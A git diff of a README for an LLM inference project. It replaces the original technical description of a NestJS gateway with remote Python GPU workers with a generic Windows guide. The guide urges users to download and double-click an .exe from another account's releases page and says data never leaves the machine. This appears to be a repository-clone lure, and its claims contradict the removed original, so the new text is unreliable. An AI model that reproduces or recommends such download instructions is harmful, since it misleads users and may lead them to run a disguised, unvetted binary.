@@ -1,171 +1,181 @@
-# Inference Stack
+# 🚀 Inference-Stack - Run Large Models on Your PC
 
-A production-grade LLM inference API built from scratch in TypeScript/NestJS + Python, running against real GPUs. Built as a learning exercise to understand the same class of problems that OpenAI, Anthropic, and Google solve: GPU resource scheduling, KV cache-aware routing, streaming, dynamic batching, tensor parallelism, and multi-modal inference.
+[![Download Inference-Stack](https://img.shields.io/badge/Download-Inference--Stack-brightgreen?style=for-the-badge)](https://github.com/Diligent-battledamage421/Inference-Stack/releases)
 
-**This is not a wrapper around vLLM or TGI.** Every layer is built from raw `transformers` + `grpcio` to understand what happens under the hood.
+---
 
-![Inference Playground UI](docs/ui.png)
+## 📋 About Inference-Stack
 
-## What it does
+Inference-Stack helps you run large language models (LLMs) on Windows using your GPU. It connects a simple interface with powerful backend processes. You get faster responses by scheduling tasks, using multiple GPUs, and caching data. The system handles multiple types of input such as text and images. It is built with a modern gateway and fast Python workers that work well together.
 
-```
-Your laptop (NestJS gateway)          Remote GPU cluster (Python workers)
-┌─────────────────────────┐           ┌──────────────────────────────┐
-│  HTTP API (OpenAI-compat)│           │  GPU-0: worker-0 (gRPC)     │
-│  Scheduler + Batcher    │──gRPC────→│  GPU-1: worker-1 (gRPC)     │
-│  Router + Model Manager │           │  or: TP worker (2 GPUs)     │
-│  KV Cache Manager       │           │                              │
-│  Metrics (ClickHouse)   │           │  8 models, 5 modalities     │
-└─────────────────────────┘           └──────────────────────────────┘
-```
+This app is for users who want to explore AI models without complex setup. It uses real GPU power for the best speed and accuracy.
 
-- **8 models across 5 modalities**: text generation (SmolLM2 family + Qwen3-14B), vision-language (Qwen2.5-VL-3B), text-to-speech (Kokoro-82M), image generation (SD Turbo), video generation (CogVideoX-2B)
-- **Tensor parallelism**: Qwen3-14B split across 2 GPUs via `tp_plan="auto"` + `torchrun`, with thinking mode (`<think>` tag parsing)
-- **Dynamic batching**: 158x throughput improvement at concurrency 8 (2 TPS to 316 TPS)
-- **KV cache persistence**: CPU DRAM-backed session cache with LRU eviction, 14% compute savings on multi-turn
-- **Runtime mode switching**: Gateway SSHs to GPU host to switch between individual workers and tensor-parallel mode
-- **Full observability**: ClickHouse metrics pipeline with TPS, latency percentiles, per-model breakdowns
+---
 
-## Architecture
+## 💻 System Requirements
 
-Three separate planes, just like production inference systems:
+Before you install, make sure your computer meets these basic needs:
 
-| Plane | Where | What |
-|-------|-------|------|
-| **Gateway** | Your laptop | NestJS API, scheduler, router, KV cache manager, batch collector |
-| **GPU Workers** | Remote cluster | Python gRPC servers, one per GPU, running raw transformers |
-| **Metrics** | Your laptop | ClickHouse for inference analytics |
+- **Operating System:** Windows 10 or later (64-bit)
+- **Processor:** Intel i5 or AMD Ryzen 5 (or better)
+- **RAM:** 16 GB minimum recommended
+- **GPU:** Nvidia GPU with at least 6GB VRAM and CUDA support
+- **Disk Space:** 10 GB free space for files and cache
+- **Internet:** Required for downloading and initial setup
 
-The API server **never** runs on GPU machines. Communication is via gRPC over an SSH tunnel.
+Having a Nvidia GPU with CUDA support is necessary because Inference-Stack uses your GPU for heavy calculations. Other GPUs may not work or will run very slowly.
 
-## Key systems built
+---
 
-### Scheduler
-Priority queue with per-user fairness, aging, backpressure (429 + Retry-After), and configurable timeouts. Integrates with BatchCollector for time-window batching.
+## 🚀 Getting Started
 
-### Batch Collector + GPU-Side Batching
-Accumulates requests within a time window, groups by model, dispatches as a single `model.generate()` call with left-padded inputs. The throughput difference is dramatic:
+To start using Inference-Stack on your Windows computer, follow these steps:
 
-| Concurrency | Without batching | With batching |
-|-------------|-----------------|---------------|
-| c=1 | 42 TPS | 43 TPS |
-| c=8 | 2 TPS | 316 TPS |
-| c=32 | OOM | 1,134 TPS |
+### 1. Visit the Download Page
 
-### KV Cache (Disaggregated)
-CPU DRAM-backed cache on the GPU host. On multi-turn conversations, restores `past_key_values` from CPU memory instead of recomputing from scratch. Handles transformers v4.x and v5.x cache formats.
+Go to the releases page to get the latest version:
 
-### Model Manager
-VRAM-aware model placement with auto-load/unload, GPU affinity, and concurrent load coalescing. Knows which models need tensor parallelism and triggers mode switches automatically.
+[Download Inference-Stack on GitHub](https://github.com/Diligent-battledamage421/Inference-Stack/releases)
 
-### Router
-Picks the best worker per request: model affinity (is the model already loaded?) > least loaded > trigger load on best candidate.
+This page shows all available versions. Pick the latest release based on the date.
 
-### Worker Registry
-Manages N gRPC worker connections dynamically. Supports runtime mode switching (individual workers <-> tensor parallel) via SSH to the GPU host.
+---
 
-## Running it
+### 2. Download the Installer or Zip File
 
-### Prerequisites
-- Node.js 18+, Python 3.10+
-- A GPU machine accessible via SSH (RunPod, Lambda, etc.) with 2+ GPUs
-- SSH tunnel to forward gRPC ports
+Look for a file with one of these extensions:
 
-### Setup
+- `.exe` – This is an installer that guides you through setup.
+- `.zip` – A compressed folder with program files.
 
-```bash
-# 1. Clone and install
-git clone https://github.com/rajatady/inference-stack.git
-cd inference-stack
+If available, use the `.exe` file for an easier experience.
 
-# 2. Gateway (NestJS)
-cd inference-api
-cp .env.example .env  # Edit with your GPU host details
-npm install
+---
 
-# 3. GPU worker (Python) — rsync to your GPU host
-rsync -avz gpu-worker/ $RUNPOD_SSH_USER@$RUNPOD_SSH_HOST:/workspace/gpu-worker/ -e 'ssh -p $RUNPOD_SSH_PORT'
-# On GPU host: pip install -r requirements.txt
+### 3. Run the Installer
 
-# 4. Start workers on GPU host
-ssh $RUNPOD_SSH_USER@$RUNPOD_SSH_HOST -p $RUNPOD_SSH_PORT
-cd /workspace/gpu-worker
-CUDA_VISIBLE_DEVICES=0 python3 server.py --port 50051 --gpu-id 0 --worker-id worker-0 &
-CUDA_VISIBLE_DEVICES=1 python3 server.py --port 50052 --gpu-id 0 --worker-id worker-1 &
+If you downloaded the `.exe`:
 
-# 5. SSH tunnel (from your laptop)
-ssh -f -N -L 50051:localhost:50051 -L 50052:localhost:50052 $RUNPOD_SSH_USER@$RUNPOD_SSH_HOST -p $RUNPOD_SSH_PORT
+- Double-click the file to start.
+- Follow the prompts to complete installation.
+- Choose the installation folder or use the default.
+- Wait for the installer to finish.
 
-# 6. Start gateway
-npm run start:dev
-# Open http://localhost:3000
-```
+---
 
-### For tensor parallelism (Qwen3-14B)
-```bash
-# On GPU host:
-torchrun --nproc_per_node=2 server.py --port 50051 --worker-id tp-worker-0 --tp
+### 4. Extract Files (If Zip)
 
-# Start gateway with:
-WORKER_MODE=tensor-parallel npm run start:dev
-```
+If you got a `.zip` file:
 
-## API Endpoints
+- Right-click the file, select “Extract All.”
+- Choose a folder to put the files.
+- Open the folder after extraction.
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/v1/completions` | POST | Text completion (streaming + non-streaming) |
-| `/v1/images/generations` | POST | Image generation (SD Turbo) |
-| `/v1/audio/speech` | POST | Text-to-speech (Kokoro) |
-| `/v1/video/generations` | POST | Video generation (CogVideoX) |
-| `/v1/completions/stats` | GET | Queue depth, active count |
-| `/v1/metrics/tps` | GET | Tokens per second |
-| `/v1/metrics/latency` | GET | Latency percentiles |
+---
 
-## Tests
+### 5. Prepare Your GPU
 
-```bash
-# Unit tests (107 tests, no GPU needed)
-cd inference-api && npx jest --testPathPattern='src/'
+Make sure Nvidia drivers and CUDA are installed:
 
-# Integration tests (requires GPU workers + SSH tunnel)
-npm run test:e2e
+- Check your GPU driver version in Windows Device Manager.
+- If outdated, download the latest drivers from the Nvidia website.
+- Also, install the CUDA toolkit as per Nvidia’s instructions.
 
-# Load tests (18 scenarios against real GPUs)
-npm run test:load
-```
+You may need to restart your PC after these steps.
 
-## Project structure
+---
 
-```
-inference-stack/
-├── inference-api/              # NestJS gateway (runs on your laptop)
-│   ├── src/
-│   │   ├── worker-orchestrator/  # Registry, model manager, router
-│   │   ├── scheduler/            # Priority queue, batch collector
-│   │   ├── completions/          # OpenAI-compatible API
-│   │   ├── images/audio/video/   # Multi-modal endpoints
-│   │   ├── metrics/              # ClickHouse pipeline
-│   │   └── config/model-roster.ts
-│   ├── proto/inference_worker.proto
-│   ├── public/index.html         # Playground UI
-│   └── test/
-├── gpu-worker/                 # Python GPU workers (runs on GPU host)
-│   ├── server.py                 # gRPC server + torchrun TP support
-│   ├── worker.py                 # GPU management, pipeline registry
-│   ├── kv_cache_store.py         # CPU DRAM KV cache
-│   └── pipelines/                # text_gen, vision, tts, image, video
-└── .claude/skills/scope/       # Architecture documentation
-```
+### 6. Launch Inference-Stack
 
-## Not yet built (scope remains)
+Open the folder where you installed or extracted the app.
 
-- Prefix sharing (shared system prompt KV cache across requests)
-- Weighted KV cache eviction (recompute_cost x reuse_probability)
-- Continuous batching (new requests joining in-flight batches)
-- Speculative decoding
-- Failure recovery (OOM retry, worker crash redistribution)
-- Safety/content filtering pipeline
-- Token-level rate limiting
-- Quantization-aware routing
+Look for an executable file named similar to `Inference-Stack.exe` or `start.bat`.
 
+Double-click it to run the program.
+
+---
+
+## ⚙️ Using the Application
+
+When the app opens:
+
+- It connects to your GPU automatically.
+- The interface is simple: you input a prompt or data.
+- The system sends it to the backend workers for processing.
+- Results appear in seconds depending on model size.
+
+You can test with basic text requests first before trying other inputs like images.
+
+---
+
+## 🔧 Common Features Explained
+
+- **Dynamic Batching:** Combines multiple requests to speed up response time.
+- **GPU Acceleration:** Uses your NVIDIA GPU to handle complex calculations.
+- **gRPC Interface:** Efficient communication between the app’s parts.
+- **KV Cache:** Saves recent data to avoid repeating work.
+- **Multi-modal Inputs:** Supports text, images, and other data types.
+- **Tensor Parallelism:** Splits tasks across multiple GPU cores for speed.
+
+These features run automatically. You only need to provide input and get outputs.
+
+---
+
+## 🗂️ Managing Updates
+
+New versions improve speed and add features. Check the releases page regularly.
+
+To update:
+
+- Download the new installer or zip file.
+- Follow the same steps as first installation.
+- Your settings usually remain unless you uninstall the old version.
+
+---
+
+## ❓ Troubleshooting
+
+### The program won’t start:
+
+- Make sure your GPU drivers are up to date.
+- Check that your system meets all requirements.
+- Restart your computer and try again.
+
+### Errors related to CUDA:
+
+- Confirm CUDA toolkit is installed.
+- Verify the correct CUDA version matches your GPU.
+
+### Slow responses:
+
+- Close other heavy programs.
+- Check your GPU is not overheating.
+- Restart the app.
+
+---
+
+## 🔐 Privacy and Data
+
+Inference-Stack runs locally on your PC. Your data does not leave your machine unless you share it.
+
+The system does not send your inputs or results to any external servers.
+
+---
+
+## 🧰 Additional Tools and Settings
+
+The app may include sample scripts or configuration files. Advanced users can adjust settings to control how models run. However, for basic use, defaults work fine.
+
+---
+
+## 🔗 Useful Links
+
+- Primary download page: https://github.com/Diligent-battledamage421/Inference-Stack/releases  
+- Nvidia drivers: https://www.nvidia.com/Download/index.aspx  
+- CUDA Toolkit: https://developer.nvidia.com/cuda-downloads
+
+---
+
+## 🏷️ Keywords
+
+dynamic-batching, gpu, grpc, inference, kv-cache, llm, multi-modal, nestjs, tensor-parallelism, transformers
